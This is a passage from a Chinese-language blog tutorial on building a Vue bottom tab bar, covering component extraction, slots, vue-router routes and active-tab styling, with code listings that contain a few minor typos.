slot&#x3D;&quot;image&quot;&gt;</span><br><span class="line">    &lt;img src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;home_active.svg&quot; alt&#x3D;&quot;&quot; slot&#x3D;&quot;img-active&quot;&gt;</span><br><span class="line">    &lt;div slot&#x3D;&quot;item&quot;&gt;首页&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;tab-item&quot;&gt;</span><br><span class="line">    &lt;img src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;home.svg&quot; alt&#x3D;&quot;&quot; slot&#x3D;&quot;image&quot;&gt;</span><br><span class="line">    &lt;img src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;home_active.svg&quot; alt&#x3D;&quot;&quot; slot&#x3D;&quot;img-active&quot;&gt;</span><br><span class="line">    &lt;div slot&#x3D;&quot;item&quot;&gt;首页&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>style代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">.tab-bar &#123;</span><br><span class="line">  display: flex;</span><br><span class="line">  position: fixed;</span><br><span class="line">  bottom: 0;</span><br><span class="line">  left: 0;</span><br><span class="line">  right: 0;</span><br><span class="line">  background-color: #f6f6f6;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.tab-item &#123;</span><br><span class="line">  flex: 1;</span><br><span class="line">  height: 49px;</span><br><span class="line">  text-align: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.tab-item img &#123;</span><br><span class="line">  width: 24px;</span><br><span class="line">  height: 24px;</span><br><span class="line">  margin-top: 3px;</span><br><span class="line">  vertical-align: middle;</span><br><span class="line">  margin-bottom: 2px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><h1 id="2-根据代码进行模块拆解"><a href="#2-根据代码进行模块拆解" class="headerlink" title="2.根据代码进行模块拆解"></a>2.根据代码进行模块拆解</h1><p>在components文件夹下新建一个Tabbar.vue文件</p><p>将外部框，也就是包裹四个选项按钮的框进行抽离</p><p>代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;tab-bar&quot;&gt;</span><br><span class="line">    &lt;tab-bar-item&gt;</span><br><span class="line">      &lt;img slot&#x3D;&quot;img&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;home.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;div slot&#x3D;&quot;item&quot;&gt;首页&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;tab-bar-item&gt;     </span><br><span class="line">    &lt;tab-bar-item&gt;</span><br><span class="line">      &lt;img slot&#x3D;&quot;img&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;category.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;div slot&#x3D;&quot;item&quot;&gt;分类&lt;&#x2F;div&gt;        </span><br><span class="line">    &lt;&#x2F;tab-bar-item&gt;     </span><br><span class="line">    &lt;tab-bar-item&gt;</span><br><span class="line">      &lt;img slot&#x3D;&quot;img&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;shopcart.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;div slot&#x3D;&quot;item&quot;&gt;购物车&lt;&#x2F;div&gt;         </span><br><span class="line">    &lt;&#x2F;tab-bar-item&gt;     </span><br><span class="line">    &lt;tab-bar-item&gt;</span><br><span class="line">      &lt;img slot&#x3D;&quot;img&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;profile.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;div slot&#x3D;&quot;item&quot;&gt;我的&lt;&#x2F;div&gt;         </span><br><span class="line">    &lt;&#x2F;tab-bar-item&gt;  </span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  import TabbarItem from &quot;.&#x2F;TabbarItem.vue&quot;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name: &quot;Tabbar&quot;,</span><br><span class="line">    components: &#123;</span><br><span class="line">      TabbarItem</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">  .tabbar &#123;</span><br><span class="line">    display: flex;</span><br><span class="line">    position: fixed;</span><br><span class="line">    bottom: 0;</span><br><span class="line">    left: 0;</span><br><span class="line">    right: 0;</span><br><span class="line">    background-color: #f6f6f6;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>在该文件夹下再新建TabbarItem.vue文件并进行每个子选项（按钮）的代码抽离</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;tab-item&quot;&gt;</span><br><span class="line">    &lt;slot name&#x3D;&quot;image&quot;&gt;&lt;&#x2F;slot&gt;</span><br><span class="line">    &lt;slot name&#x3D;&quot;item&quot;&gt;&lt;&#x2F;slot&gt;    </span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name: &quot;TabbarItem&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">  .tab-item &#123;</span><br><span class="line">    flex: 1;</span><br><span class="line">    height: 49px;</span><br><span class="line">    text-align: center;</span><br><span class="line">  &#125;</span><br><span class="line">  .tab-item img &#123;</span><br><span class="line">    width: 24px;</span><br><span class="line">    height: 24px;</span><br><span class="line">    margin-top: 3px;</span><br><span class="line">    vertical-align: middle;</span><br><span class="line">    margin-bottom: 2px;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><h1 id="3-创建路由，构建相关路由页面"><a href="#3-创建路由，构建相关路由页面" class="headerlink" title="3.创建路由，构建相关路由页面"></a>3.创建路由，构建相关路由页面</h1><p>路由代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//导入模块</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">'vue-router'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Home = <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'../views/Home/Home.vue'</span>)</span><br><span class="line"><span class="keyword">const</span> Category = <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'../views/Category/Category.vue'</span>)</span><br><span class="line"><span class="keyword">const</span> Profile = <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'../views/Profile/Proile.vue'</span>)</span><br><span class="line"><span class="keyword">const</span> Shopcart = <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">'../views/Shopcart/Shopcart.vue'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用路由</span></span><br><span class="line">Vue.use(VueRouter)</span><br><span class="line"></span><br><span class="line"><span class="comment">//路由映射表</span></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">''</span>,</span><br><span class="line">    <span class="comment">// name: 'home',</span></span><br><span class="line">    redirect: <span class="string">'/home'</span>,</span><br><span class="line">  &#125;,  </span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">'/home'</span>,</span><br><span class="line">    name: <span class="string">'home'</span>,</span><br><span class="line">    component: Home</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">'/category'</span>,</span><br><span class="line">    name: <span class="string">'category'</span>,</span><br><span class="line">    component: Category</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">'/shopcart'</span>,</span><br><span class="line">    name: <span class="string">'shopcart'</span>,</span><br><span class="line">    component: Shopcart</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">'/profile'</span>,</span><br><span class="line">    name: <span class="string">'profile'</span>,</span><br><span class="line">    component: Profile</span><br><span class="line">  &#125;]</span><br><span class="line"></span><br><span class="line"><span class="comment">//新建路由</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  routes,</span><br><span class="line">  mode: <span class="string">'history'</span> <span class="comment">//将hash改为history，防止url有#出现</span></span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//导出路由</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure><p>相关路由页面目录</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/vue%E5%AE%9E%E7%8E%B0tabbar/image-20201018191045712.png" alt="image-20201018191045712"></p><h1 id="4-动态切换路由"><a href="#4-动态切换路由" class="headerlink" title="4.动态切换路由"></a>4.动态切换路由</h1><p>跳回到TabbarItem.vue文件，为其动态绑定一个点击事件<code>change</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;tab-item&quot; @click&#x3D;&quot;change&quot;&gt;</span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>实现具体的路由跳转操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name: &quot;TabbarItem&quot;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">      change() &#123;</span><br><span class="line">        this.$router.push(this.path)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>到这一步，你会发现是不能完成路由跳转的，因为我们需要动态获取到用户点击的是哪个按钮，我们需要动态的获取父级的按钮选项中要跳转的页面，所以我们到它的父级页面去定义一个path属性，同时赋上各自的路由地址</p><p>Tabbar.vue代码(path=”地址”)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;tab-bar&quot;&gt;</span><br><span class="line">    &lt;tab-bar-item path&#x3D;&quot;&#x2F;home&quot; &gt;</span><br><span class="line">      &lt;img slot&#x3D;&quot;img&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;home.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;img slot&#x3D;&quot;img-active&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;home_active.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;div slot&#x3D;&quot;item&quot;&gt;首页&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;tab-bar-item&gt;     </span><br><span class="line">    &lt;tab-bar-item path&#x3D;&quot;&#x2F;category&quot;&gt;</span><br><span class="line">      &lt;img slot&#x3D;&quot;img&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;category.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;img slot&#x3D;&quot;img-active&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;category_active.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;div slot&#x3D;&quot;item&quot;&gt;分类&lt;&#x2F;div&gt;        </span><br><span class="line">    &lt;&#x2F;tab-bar-item&gt;     </span><br><span class="line">    &lt;tab-bar-item path&#x3D;&quot;&#x2F;shopcart&quot;&gt;</span><br><span class="line">      &lt;img slot&#x3D;&quot;img&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;shopcart.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;img slot&#x3D;&quot;img-active&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;shopcart_active.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;div slot&#x3D;&quot;item&quot;&gt;购物车&lt;&#x2F;div&gt;         </span><br><span class="line">    &lt;&#x2F;tab-bar-item&gt;     </span><br><span class="line">    &lt;tab-bar-item path&#x3D;&quot;&#x2F;profile&quot;&gt;</span><br><span class="line">      &lt;img slot&#x3D;&quot;img&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;profile.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;img slot&#x3D;&quot;img-active&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;profile_active.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;div slot&#x3D;&quot;item&quot;&gt;我的&lt;&#x2F;div&gt;         </span><br><span class="line">    &lt;&#x2F;tab-bar-item&gt;  </span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br></pre></td></tr></table></figure><p>TabbarItem定义props属性去接收这些变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name: &#39;TabBarItem&#39;,</span><br><span class="line">    props:&#123;</span><br><span class="line">      path: String,</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">      change() &#123;</span><br><span class="line">        this.$router.push(this.path)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h1 id="5-切换选项样式改变"><a href="#5-切换选项样式改变" class="headerlink" title="5.切换选项样式改变"></a>5.切换选项样式改变</h1><p>接着，为了实现点击哪个选项，哪个选项的图片以及字体颜色就会相应的改变，我们需要给TabbarItem一个判断语句，用来判断该组件对应的路由当前是否处于活跃状态，首先为图片定义if-else语句，对其进行判断，若活跃，则显示有颜色的图片，同时，定义一个计算属性-isActive，进行语句判断，若当前活跃的页面就是该组件路由，则显示活跃的图片样式—核心代码（  <code>this.$route.path.indexOf(this.path) !== -1</code>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;tab-item&quot; @click&#x3D;&quot;change&quot;&gt;</span><br><span class="line">    &lt;div v-if&#x3D;&quot;!isActive&quot;&gt;</span><br><span class="line">      &lt;slot name&#x3D;&quot;img&quot;&gt;&lt;&#x2F;slot&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div v-else&gt;</span><br><span class="line">      &lt;slot name&#x3D;&quot;img-active&quot;&gt;&lt;&#x2F;slot&gt;     </span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;slot name&#x3D;&#39;item&#39;&gt;&lt;&#x2F;slot&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name: &#39;TabBarItem&#39;,</span><br><span class="line">    props:&#123;</span><br><span class="line">      path: String,</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">      change() &#123;</span><br><span class="line">        this.$router.push(this.path)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    computed: &#123;</span><br><span class="line">      isActive() &#123;</span><br><span class="line">        return this.$route.path.indexOf(this.path) !&#x3D;&#x3D; -1</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">  .tab-item &#123;</span><br><span class="line">  flex: 1;</span><br><span class="line">  height: 49px;</span><br><span class="line">  text-align: center;</span><br><span class="line">&#125;</span><br><span class="line">.tab-item img &#123;</span><br><span class="line">    width: 24px;</span><br><span class="line">    height: 24px;</span><br><span class="line">    margin-top: 3px;</span><br><span class="line">    &#x2F;* 去除图片底部内容 *&#x2F;</span><br><span class="line">    vertical-align: middle;</span><br><span class="line">    margin-bottom: 2px;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;* .isred &#123;</span><br><span class="line">  color: red</span><br><span class="line">&#125; *&#x2F;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>然后，动态绑定style，同样使用isActive计算属性进行判断</p><p>为字体动态绑定样式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div :style&#x3D;&quot;activeStyle&quot;&gt;</span><br><span class="line">  &lt;slot name&#x3D;&#39;item&#39;&gt;&lt;&#x2F;slot&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>方法具体实现</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">computed: &#123;</span><br><span class="line">  activeStyle() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.isActive ? &#123;<span class="attr">color</span>: red&#125; :&#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果想为其自定义颜色，可以为其定义一个可以动态获取它父组件的属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">props:&#123;</span><br><span class="line">  path: <span class="built_in">String</span>,</span><br><span class="line">  <span class="comment">//自定义颜色</span></span><br><span class="line">  activeColor: &#123;</span><br><span class="line">    type: <span class="built_in">String</span>,</span><br><span class="line">    <span class="keyword">default</span>: <span class="string">'red'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后你就可以自定义你想要的颜色啦</p><p>在其父组件下自定义颜色</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;tab-bar-item path&#x3D;&quot;&#x2F;home&quot; activeColor&#x3D;&quot;blue&quot; &gt;</span><br><span class="line">  &lt;img slot&#x3D;&quot;img&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;home.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">  &lt;img slot&#x3D;&quot;img-active&quot; src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;home_active.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">  &lt;div slot&#x3D;&quot;item&quot;&gt;首页&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;tab-bar-item&gt;</span><br></pre></td></tr></table></figure><h1 id="6-组件抽离，插槽安排"><a href="#6-组件抽离，插槽安排" class="headerlink" title="6.组件抽离，插槽安排"></a>6.组件抽离，插槽安排</h1><p>然后就是将Tabbar.vue进行抽离，定义一个插槽供插入的选项按钮，然后再新建一个MainTabbar文件用来组装这些组件，最后再在App.vue中引用该组件</p><p>最后的代码</p><p>Tabbar.vue</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;tab-bar&quot;&gt;</span><br><span class="line">      &lt;slot&gt;&lt;&#x2F;slot&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#39;TarBar&#39;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.tab-bar &#123;</span><br><span class="line">  display: flex;</span><br><span class="line"></span><br><span class="line">  position: fixed;</span><br><span class="line">  bottom: 0;</span><br><span class="line">  left: 0;</span><br><span class="line">  right: 0;</span><br><span class="line">  background-color: #C7C7C7;</span><br><span class="line">  box-shadow: 0, -1px, 1px, rgba(216, 214, 214, 0.1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>TabbarItem.vue</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;tab-item&quot; @click&#x3D;&quot;change&quot;&gt;</span><br><span class="line">    &lt;div v-if&#x3D;&quot;!isActive&quot;&gt;</span><br><span class="line">      &lt;slot name&#x3D;&quot;img&quot;&gt;&lt;&#x2F;slot&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div 